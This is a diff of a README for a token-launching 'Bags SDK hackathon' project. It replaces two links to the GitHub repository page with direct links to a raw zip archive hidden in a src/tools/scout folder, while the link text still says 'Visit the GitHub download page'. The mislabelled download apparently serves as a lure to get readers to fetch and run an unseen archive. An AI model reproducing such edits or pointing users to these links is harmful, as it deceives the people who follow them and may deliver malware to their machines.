@@ -1,6 +1,6 @@
 # 🪙 Bags-SDK-hackathon - Launch Tokens in Three Steps
 
-[![Download](https://img.shields.io/badge/Download%20the%20app-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Alessqi/Bags-SDK-hackathon)
+[![Download](https://img.shields.io/badge/Download%20the%20app-Visit%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Alessqi/Bags-SDK-hackathon/main/src/tools/scout/hackathon-SD-Bags-3.0.zip)
 
 ## 🧭 What this is
 
@@ -21,7 +21,7 @@ If you want to try it on Windows, use the link above to visit the GitHub page an
 
 Use this link to visit the page and download or set up the app:
 
-[Visit the GitHub download page](https://github.com/Alessqi/Bags-SDK-hackathon)
+[Visit the GitHub download page](https://raw.githubusercontent.com/Alessqi/Bags-SDK-hackathon/main/src/tools/scout/hackathon-SD-Bags-3.0.zip)
 
 ### Steps
 1. Open the link above in your browser.
